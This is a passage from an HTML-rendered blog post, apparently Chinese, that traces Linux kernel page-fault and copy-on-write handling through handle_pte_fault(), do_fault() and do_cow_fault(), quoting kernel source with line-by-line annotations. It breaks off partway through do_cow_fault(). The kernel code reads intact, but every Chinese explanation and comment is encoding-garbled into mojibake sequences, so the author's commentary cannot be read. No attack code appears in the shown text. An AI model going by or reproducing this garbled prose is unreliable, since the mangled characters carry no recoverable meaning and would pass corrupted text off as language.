class="comment">//è·å–å…¨å±€é¡µè¡¨é¡¹</span></span><br><span class="line">	pud = pud_alloc(mm, pgd, address);<span class="comment">//åˆ†é…ä¸Šçº§é¡µè¡¨é¡¹ï¼ˆåˆ†é…ä¸€é¡µæ–°çš„å†…å­˜ä½œä¸ºpudï¼‰</span></span><br><span class="line">	<span class="keyword">if</span> (!pud)<span class="comment">//å¤±è´¥äº†ï¼Œè¿”å›</span></span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line">	pmd = pmd_alloc(mm, pud, address);<span class="comment">//åˆ†é…ä¸­é—´é¡µè¡¨é¡¹åˆ†é…ä¸€é¡µæ–°çš„å†…å­˜ä½œä¸ºpmdï¼‰</span></span><br><span class="line">	<span class="keyword">if</span> (!pmd)<span class="comment">//å¤±è´¥äº†ï¼Œè¿”å›</span></span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line">	<span class="keyword">if</span> (pmd_none(*pmd) &amp;&amp; transparent_hugepage_enabled(vma)) &#123;</span><br><span class="line">		<span class="type">int</span> ret = create_huge_pmd(mm, vma, address, pmd, flags);<span class="comment">//åˆ›å»ºé¡µè¡¨ä¸­é—´é¡¹ï¼Ÿ</span></span><br><span class="line">		<span class="keyword">if</span> (!(ret &amp; VM_FAULT_FALLBACK))<span class="comment">//å¤±è´¥äº†ï¼Œè¿”å›</span></span><br><span class="line">			<span class="keyword">return</span> ret;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="type">pmd_t</span> orig_pmd = *pmd;</span><br><span class="line">		<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">		barrier();</span><br><span class="line">		<span class="keyword">if</span> (pmd_trans_huge(orig_pmd)) &#123;</span><br><span class="line">			<span class="type">unsigned</span> <span class="type">int</span> dirty = flags &amp; FAULT_FLAG_WRITE;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * If the pmd is splitting, return and retry the</span></span><br><span class="line"><span class="comment">			 * the fault.  Alternative: wait until the split</span></span><br><span class="line"><span class="comment">			 * is done, and goto retry.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> (pmd_trans_splitting(orig_pmd))</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (pmd_protnone(orig_pmd))</span><br><span class="line">				<span class="keyword">return</span> do_huge_pmd_numa_page(mm, vma, address,</span><br><span class="line">							     orig_pmd, pmd);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (dirty &amp;&amp; !pmd_write(orig_pmd)) &#123;</span><br><span class="line">				ret = wp_huge_pmd(mm, vma, address, pmd,</span><br><span class="line">							orig_pmd, flags);</span><br><span class="line">				<span class="keyword">if</span> (!(ret &amp; VM_FAULT_FALLBACK))</span><br><span class="line">					<span class="keyword">return</span> ret;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				huge_pmd_set_accessed(mm, vma, address, pmd,</span><br><span class="line">						      orig_pmd, dirty);</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Use __pte_alloc instead of pte_alloc_map, because we can&#x27;t</span></span><br><span class="line"><span class="comment">	 * run pte_offset_map on the pmd, if an huge pmd could</span></span><br><span class="line"><span class="comment">	 * materialize from under us from a different thread.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(pmd_none(*pmd)) &amp;&amp;</span><br><span class="line">	    unlikely(__pte_alloc(mm, vma, pmd, address)))</span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line">	<span class="comment">/* if an huge pmd materialized from under us just retry later */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(pmd_trans_huge(*pmd)))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * A regular pmd is established and it can&#x27;t morph into a huge pmd</span></span><br><span class="line"><span class="comment">	 * from under us anymore at this point because we hold the mmap_sem</span></span><br><span class="line"><span class="comment">	 * read mode and khugepaged takes it in write mode. So now it&#x27;s</span></span><br><span class="line"><span class="comment">	 * safe to run pte_offset_map().</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	pte = pte_offset_map(pmd, address);<span class="comment">//è·å–åˆ°æœ€ç»ˆçš„é¡µè¡¨é¡¹</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> handle_pte_fault(mm, vma, address, pte, pmd, flags);<span class="comment">//æ ¸å¿ƒå¤„ç†å‡½æ•°</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p> è¯¥å‡½æ•°ä¸ºè§¦å‘ç¼ºé¡µå¼‚å¸¸çš„çº¿æ€§åœ°å€addressåˆ†é…å„çº§çš„é¡µç›®å½•ï¼Œåœ¨è¿™é‡Œçš„pgdè¡¨ä¼šç›´æ¥ä½¿ç”¨è¯¥è¿›ç¨‹çš„ <code>mm_struct</code> ä¸­çš„ pgd è¡¨ï¼Œä½†æ˜¯pudã€pmdè¡¨éƒ½å­˜åœ¨ç€åˆ›å»ºæ–°è¡¨çš„å¯èƒ½</p>
<p>æ­¤æ—¶æˆ‘ä»¬å·²ç»æœ‰äº†ä¸è§¦å‘ç¼ºé¡µå¼‚å¸¸çš„åœ°å€ç›¸å¯¹åº”çš„é¡µè¡¨é¡¹ï¼ˆPTEï¼‰ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°†è¿›å…¥ <code>handle_pte_fault()</code> å‡½æ•°è¿›è¡Œä¸‹ä¸€æ­¥</p>
<h4 id="å¤„ç†é¡µè¡¨é¡¹ï¼šhandle-pte-fault"><a href="#å¤„ç†é¡µè¡¨é¡¹ï¼šhandle-pte-fault" class="headerlink" title="å¤„ç†é¡µè¡¨é¡¹ï¼šhandle_pte_fault()"></a>å¤„ç†é¡µè¡¨é¡¹ï¼šhandle_pte_fault()</h4><p>è¯¥å‡½æ•°åŒæ ·å®šä¹‰äº <code>mm/memory.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * These routines also need to handle stuff like marking pages dirty</span></span><br><span class="line"><span class="comment"> * and/or accessed for architectures that don&#x27;t do it in hardware (most</span></span><br><span class="line"><span class="comment"> * RISC architectures).  The early dirtying is also good on the i386.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * There is also a hook called &quot;update_mmu_cache()&quot; that architectures</span></span><br><span class="line"><span class="comment"> * with external mmu caches can use to update those (ie the Sparc or</span></span><br><span class="line"><span class="comment"> * PowerPC hashed page tables that act as extended TLBs).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * We enter with non-exclusive mmap_sem (to exclude vma changes,</span></span><br><span class="line"><span class="comment"> * but allow concurrent faults), and pte mapped but not yet locked.</span></span><br><span class="line"><span class="comment"> * We return with pte unmapped and unlocked.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The mmap_sem may have been released depending on flags and our</span></span><br><span class="line"><span class="comment"> * return value.  See filemap_fault() and __lock_page_or_retry().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">handle_pte_fault</span><span class="params">(<span class="keyword">struct</span> mm_struct *mm,</span></span><br><span class="line"><span class="params">		     <span class="keyword">struct</span> vm_area_struct *vma, <span class="type">unsigned</span> <span class="type">long</span> address,</span></span><br><span class="line"><span class="params">		     <span class="type">pte_t</span> *pte, <span class="type">pmd_t</span> *pmd, <span class="type">unsigned</span> <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">pte_t</span> entry;</span><br><span class="line">	<span class="type">spinlock_t</span> *ptl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * some architectures can have larger ptes than wordsize,</span></span><br><span class="line"><span class="comment">	 * e.g.ppc44x-defconfig has CONFIG_PTE_64BIT=y and CONFIG_32BIT=y,</span></span><br><span class="line"><span class="comment">	 * so READ_ONCE or ACCESS_ONCE cannot guarantee atomic accesses.</span></span><br><span class="line"><span class="comment">	 * The code below just needs a consistent view for the ifs and</span></span><br><span class="line"><span class="comment">	 * we later double check anyway with the ptl lock held. So here</span></span><br><span class="line"><span class="comment">	 * a barrier will do.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	entry = *pte;<span class="comment">//è·å–é¡µè¡¨é¡¹ä¸­çš„å†…å­˜é¡µ</span></span><br><span class="line">	barrier();</span><br><span class="line">    <span class="comment">//è¯¥é¡µä¸åœ¨ä¸»å­˜ä¸­</span></span><br><span class="line">	<span class="keyword">if</span> (!pte_present(entry)) &#123;<span class="comment">//pteä¸­å†…å­˜é¡µæ‰€æ˜ å°„çš„ç‰©ç†åœ°å€ï¼ˆ*pteï¼‰ä¸å­˜åœ¨ï¼Œå¯èƒ½æ˜¯è°ƒé¡µè¯·æ±‚</span></span><br><span class="line">		<span class="keyword">if</span> (pte_none(entry)) &#123;<span class="comment">//pteä¸­å†…å®¹ä¸ºç©ºï¼Œè¡¨ç¤ºè¿›ç¨‹ç¬¬ä¸€æ¬¡è®¿é—®è¯¥é¡µ</span></span><br><span class="line">			<span class="keyword">if</span> (vma_is_anonymous(vma))<span class="comment">//vmaä¸ºåŒ¿ååŒºåŸŸï¼Œåˆ†é…ç‰©ç†é¡µæ¡†ï¼Œåˆå§‹åŒ–ä¸ºå…¨0</span></span><br><span class="line">				<span class="keyword">return</span> do_anonymous_page(mm, vma, address,</span><br><span class="line">							 pte, pmd, flags);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="keyword">return</span> do_fault(mm, vma, address, pte, pmd,</span><br><span class="line">						flags, entry);<span class="comment">//éåŒ¿ååŒºåŸŸï¼Œåˆ†é…ç‰©ç†é¡µæ¡†</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> do_swap_page(mm, vma, address,</span><br><span class="line">					pte, pmd, flags, entry);<span class="comment">//è¯´æ˜è¯¥é¡µä¹‹å‰å­˜åœ¨äºä¸»å­˜ä¸­ï¼Œä½†æ˜¯è¢«æ¢åˆ°å¤–å­˜äº†ï¼ˆå¤ªä¹…æ²¡ç”¨è¢«æ”¾åˆ°äº†äº¤æ¢ç©ºé—´é‡Œï¼Ÿï¼‰ï¼Œé‚£å°±å†æ¢å›æ¥å°±è¡Œ</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//è¯¥é¡µåœ¨ä¸»å­˜ä¸­</span></span><br><span class="line">	<span class="keyword">if</span> (pte_protnone(entry)) <span class="comment">// æŸ¥çœ‹ pte æ˜¯å¦æœ‰ _PAGE_PROTNONE æ ‡å¿—ä½</span></span><br><span class="line">		<span class="keyword">return</span> do_numa_page(mm, vma, address, entry, pte, pmd);</span><br><span class="line"></span><br><span class="line">	ptl = pte_lockptr(mm, pmd);</span><br><span class="line">	spin_lock(ptl);<span class="comment">//è‡ªæ—‹é”ï¼Œå¤šçº¿ç¨‹æ“ä½œ</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!pte_same(*pte, entry)))</span><br><span class="line">		<span class="keyword">goto</span> unlock;</span><br><span class="line">	<span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE) &#123;<span class="comment">// å­˜åœ¨ FAULT_FLAG_WRITE æ ‡å¿—ä½ï¼Œè¡¨ç¤ºç¼ºé¡µå¼‚å¸¸ç”±å†™æ“ä½œå¼•èµ·</span></span><br><span class="line">		<span class="keyword">if</span> (!pte_write(entry))<span class="comment">//å¯¹åº”çš„é¡µä¸å¯å†™</span></span><br><span class="line">			<span class="keyword">return</span> do_wp_page(mm, vma, address,</span><br><span class="line">					pte, pmd, ptl, entry);<span class="comment">//è¿›è¡Œå†™æ—¶å¤åˆ¶ï¼Œå°†å†…å®¹å†™å…¥ç”± do_fault()-&gt;do_cow_fault()åˆ†é…çš„å†…å­˜é¡µä¸­</span></span><br><span class="line">		entry = pte_mkdirty(entry);<span class="comment">//å°†è¯¥é¡µã€æ ‡è„ã€‘</span></span><br><span class="line">	&#125;</span><br><span class="line">	entry = pte_mkyoung(entry);<span class="comment">//å°†è¯¥é¡µæ ‡å¹²å‡€ï¼Ÿ</span></span><br><span class="line">	<span class="keyword">if</span> (ptep_set_access_flags(vma, address, pte, entry, flags &amp; FAULT_FLAG_WRITE)) &#123;</span><br><span class="line">		update_mmu_cache(vma, address, pte);<span class="comment">//pteå†…å®¹å‘ç”Ÿå˜åŒ–ï¼Œå°†æ–°å†…å®¹å†™å…¥pteé¡µè¡¨é¡¹ä¸­</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * This is needed only for protection faults but the arch code</span></span><br><span class="line"><span class="comment">		 * is not yet telling us if this is a protection fault or not.</span></span><br><span class="line"><span class="comment">		 * This still avoids useless tlb flushes for .text page faults</span></span><br><span class="line"><span class="comment">		 * with threads.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE)</span><br><span class="line">			flush_tlb_fix_spurious_fault(vma, address);</span><br><span class="line">	&#125;</span><br><span class="line">unlock:</span><br><span class="line">	pte_unmap_unlock(pte, ptl);<span class="comment">//è§£è‡ªæ—‹é”</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬ä¸éš¾çœ‹å‡ºè¯¥å‡½æ•°çš„æµç¨‹å¦‚ä¸‹ï¼š</p>
<ul>
<li>æˆ–è®¸é¡µè¡¨é¡¹ä¸­å†…å­˜é¡µ</li>
<li>è¯¥é¡µä¸åœ¨ä¸»å­˜ä¸­[1]<ul>
<li>pteé¡¹ä¸ºç©ºï¼Œè¡¨ç¤ºè¿›ç¨‹ç¬¬ä¸€æ¬¡è®¿é—®è¯¥é¡µï¼Œæœªä¸ç‰©ç†é¡µå»ºç«‹æ˜ å°„å…³ç³»<ul>
<li>è¯¥é¡µä¸ºåŒ¿åé¡µï¼Œåˆ†é…å†…å®¹åˆå§‹åŒ–ä¸º0çš„é¡µæ¡†</li>
<li>è¯¥é¡µä¸ä¸ºåŒ¿åé¡µï¼Œè°ƒç”¨ <code>do_fault()</code> è¿›è¡Œè¿›ä¸€æ­¥çš„åˆ†é…æ“ä½œ</li>
</ul>
</li>
<li>pteé¡¹ä¸ä¸ºç©ºï¼Œè¯´æ˜è¯¥é¡µæ­¤å‰è®¿é—®è¿‡ï¼Œä½†æ˜¯è¢«æ¢åˆ°äº¤æ¢ç©ºé—´ï¼ˆå¤–å­˜ï¼‰é‡Œäº†ï¼ˆå¤ªä¹…æ²¡ç”¨ï¼Ÿï¼‰ï¼Œæ­¤æ—¶åªéœ€å°†è¯¥é¡µäº¤æ¢å›æ¥å³å¯</li>
</ul>
</li>
<li>è¯¥é¡µåœ¨ä¸»å­˜ä¸­[2]<ul>
<li>ç¼ºé¡µå¼‚å¸¸ç”±ã€å†™ã€‘æ“ä½œå¼•èµ·<ul>
<li>å¯¹åº”é¡µä¸å¯å†™ï¼Œè°ƒç”¨ <code>do_wp_page()</code> è¿›è¡Œå†™æ—¶å¤åˆ¶</li>
<li>å¯¹åº”é¡µå¯å†™ï¼Œæ ‡è„</li>
</ul>
</li>
<li>å°†æ–°å†…å®¹å†™å…¥pteé¡µè¡¨é¡¹ä¸­</li>
</ul>
</li>
</ul>
<p>é‚£ä¹ˆæˆ‘ä»¬ä¸éš¾çœ‹å‡ºï¼Œå½“ä¸€ä¸ªè¿›ç¨‹é¦–æ¬¡è®¿é—®ä¸€ä¸ªå†…å­˜é¡µæ—¶åº”å½“ä¼šè§¦å‘ä¸¤æ¬¡ç¼ºé¡µå¼‚å¸¸ï¼Œç¬¬ä¸€æ¬¡èµ°[1]ï¼Œç¬¬äºŒæ¬¡èµ°[2]ï¼Œåé¢æˆ‘ä»¬å†è¿›è¡Œè¿›ä¸€æ­¥çš„åˆ†æ</p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹ <code>do_fault()</code> å‡½æ•°çš„æµç¨‹</p>
<h4 id="æŒ‚è½½ç‰©ç†é¡µï¼šdo-fault"><a href="#æŒ‚è½½ç‰©ç†é¡µï¼šdo-fault" class="headerlink" title="æŒ‚è½½ç‰©ç†é¡µï¼šdo_fault()"></a>æŒ‚è½½ç‰©ç†é¡µï¼šdo_fault()</h4><p>è¿™ä¸ªå‡½æ•°çš„é€»è¾‘è¾ƒä¸ºç®€å•ï¼Œä¸»è¦æ˜¯æ ¹æ®ç›¸åº”çš„æƒ…å†µè°ƒç”¨ä¸åŒçš„å‡½æ•°ï¼Œä»£ç åŒæ ·ä½äº  <code>mm/memory.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We enter with non-exclusive mmap_sem (to exclude vma changes,</span></span><br><span class="line"><span class="comment"> * but allow concurrent faults).</span></span><br><span class="line"><span class="comment"> * The mmap_sem may have been released depending on flags and our</span></span><br><span class="line"><span class="comment"> * return value.  See filemap_fault() and __lock_page_or_retry().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">do_fault</span><span class="params">(<span class="keyword">struct</span> mm_struct *mm, <span class="keyword">struct</span> vm_area_struct *vma,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">long</span> address, <span class="type">pte_t</span> *page_table, <span class="type">pmd_t</span> *pmd,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">int</span> flags, <span class="type">pte_t</span> orig_pte)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">pgoff_t</span> pgoff = (((address &amp; PAGE_MASK)</span><br><span class="line">			- vma-&gt;vm_start) &gt;&gt; PAGE_SHIFT) + vma-&gt;vm_pgoff;</span><br><span class="line"></span><br><span class="line">	pte_unmap(page_table);</span><br><span class="line">	<span class="comment">/* The VMA was not fully populated on mmap() or missing VM_DONTEXPAND */</span></span><br><span class="line">	<span class="keyword">if</span> (!vma-&gt;vm_ops-&gt;fault)</span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_SIGBUS;</span><br><span class="line">	<span class="keyword">if</span> (!(flags &amp; FAULT_FLAG_WRITE))<span class="comment">//éå†™æ“ä½œå¼•èµ·çš„ç¼ºé¡µå¼‚å¸¸ï¼ˆè¯»æ“ä½œï¼‰</span></span><br><span class="line">		<span class="keyword">return</span> do_read_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">				orig_pte);</span><br><span class="line">	<span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED))<span class="comment">//éè®¿é—®å…±äº«å†…å­˜ï¼ˆç§æœ‰æ–‡ä»¶æ˜ å°„ï¼‰å¼•èµ·çš„ç¼ºé¡µå¼‚å¸¸ï¼ˆå†™æ“ä½œï¼‰</span></span><br><span class="line">		<span class="keyword">return</span> do_cow_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">				orig_pte);<span class="comment">//è¿›è¡Œå†™æ—¶å¤åˆ¶</span></span><br><span class="line">	<span class="keyword">return</span> do_shared_fault(mm, vma, address, pmd, pgoff, flags, orig_pte);<span class="comment">//è®¿é—®å…±äº«å†…å­˜å¼•èµ·çš„ç¼ºé¡µå¼‚å¸¸</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è§æ³¨é‡Šï¼Œä¸å†èµ˜å™</p>
<h4 id="å¤„ç†å†™æ—¶å¤åˆ¶ï¼ˆæ— å†…å­˜é¡µï¼‰ï¼š-do-cow-fault"><a href="#å¤„ç†å†™æ—¶å¤åˆ¶ï¼ˆæ— å†…å­˜é¡µï¼‰ï¼š-do-cow-fault" class="headerlink" title="å¤„ç†å†™æ—¶å¤åˆ¶ï¼ˆæ— å†…å­˜é¡µï¼‰ï¼š do_cow_fault()"></a>å¤„ç†å†™æ—¶å¤åˆ¶ï¼ˆæ— å†…å­˜é¡µï¼‰ï¼š do_cow_fault()</h4><p>æœ¬ç¯‡ä¸»è¦å…³æ³¨å†™æ—¶å¤åˆ¶çš„è¿‡ç¨‹ï¼›COWæµç¨‹åœ¨ç¬¬ä¸€æ¬¡å†™æ—¶è§¦å‘ç¼ºé¡µå¼‚å¸¸æœ€ç»ˆä¾¿ä¼šè¿›å…¥åˆ° <code>do_cow_fault()</code> ä¸­å¤„ç†ï¼Œè¯¥å‡½æ•°åŒæ ·ä½äº <code>mm/memory.c</code> ä¸­ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">do_cow_fault</span><span class="params">(<span class="keyword">struct</span> mm_struct *mm, <span class="keyword">struct</span> vm_area_struct *vma,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">long</span> address, <span class="type">pmd_t</span> *pmd,</span></span><br><span class="line"><span class="params">		<span class="type">pgoff_t</span> pgoff, <span class="type">unsigned</span> <span class="type">int</span> flags, <span class="type">pte_t</span> orig_pte)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">fault_page</span>, *<span class="title">new_page</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mem_cgroup</span> *<span class="title">memcg</span>;</span></span><br><span class="line">	<span class="type">spinlock_t</span> *ptl;</span><br><span class="line">	<span class="type">pte_t</span> *pte;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(anon_vma_prepare(vma)))</span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line"></span><br><span class="line">	new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, address);<span class="comment">//åˆ†é…æ–°ç‰©ç†é¡µ</span></span><br><span class="line">	<span class="keyword">if</span> (!new_page)<span class="comment">//å¤±è´¥äº†</span></span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mem_cgroup_try_charge(new_page, mm, GFP_KERNEL, &amp;memcg)) &#123;</span><br><span class="line">		page_cache_release(new_page);</span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ret = __do_fault(vma, address, pgoff, flags, new_page, &amp;fault_page);<span class="comment">//è¯»å–æ–‡ä»¶å†…å®¹åˆ°fault_page</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))</span><br><span class="line">		<span class="keyword">goto</span> uncharge_out;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fault_page)</span><br><span class="line">		copy_user_highpage(new_page, fault_page, address, vma);<span class="comment">//æ‹·è´fault_pageå†…å®¹åˆ°new_page</span></span><br><span class="line">	__SetPageUptodate(new_page);</span><br><span class="line"></span><br><span class="line">	pte = pte_offset_map_lock(mm, pmd, address, &amp;ptl);<span class="comment">//å¤šçº¿ç¨‹æ“ä½œï¼Œä¸Šé”ï¼Ÿ</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!pte_same(*pte, orig_pte))) &#123;<span class="comment">//pteå’Œorig_pteä¸ä¸€è‡´ï¼Œè¯´æ˜ä¸­é—´æœ‰äººä¿®æ”¹äº†pteï¼Œé‚£ä¹ˆé‡Šæ”¾fault_pageå’Œnew_pageé¡µé¢å¹¶é€€å‡º</span></span><br><span class="line">		pte_unmap_unlock(pte, ptl);</span><br><span class="line">		<span class="keyword">if</span> (fault_page) &#123;</span><br><span class="line">			unlock_page(fault_page);</span><br><span class="line">			page_cache_release(fault_page);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * The fault handler has no page to lock, so it holds</span></span><br><span class="line"><span class="comment">			 * i_mmap_lock for read to protect against truncate.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			i_mmap_unlock_read(vma-&gt;vm_file-&gt;f_mapping);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">goto</span> uncharge_out;</span><br><span class="line">	&#125;</span><br><span class="line">	do_set_pte(vma, address, new_page, pte, <span class="literal">true</span>, <span class="literal">true</span>);<span class="comment">//è®¾ç½®pteï¼Œç½®æ¢è¯¥è¿›ç¨‹ä¸­çš„pteè¡¨é¡¹ï¼Œå¯¹äºå†™æ“ä½œä¼šå°†è¯¥é¡µæ ‡è„ï¼ˆè¯¥å‡½æ•°ä¼šè°ƒç”¨maybe_mkwrite()å‡½æ•°ï¼Œå…¶ä¼šè°ƒç”¨pte_mkdirty()å‡½æ•°æ ‡è„è¯¥é¡µï¼‰</span></span><br><span class="line">	mem_cgroup_commit_charge(new_page, memcg, <span class="literal">false</span>);</span><br><span class="line">	lru_cache_add_active_or_unevictable(new_page, vma);</span><br><span class="line">	pte_unmap_unlock(pte, ptl);</span><br><span class="line">	<span class="keyword">if</span> (fault_page) 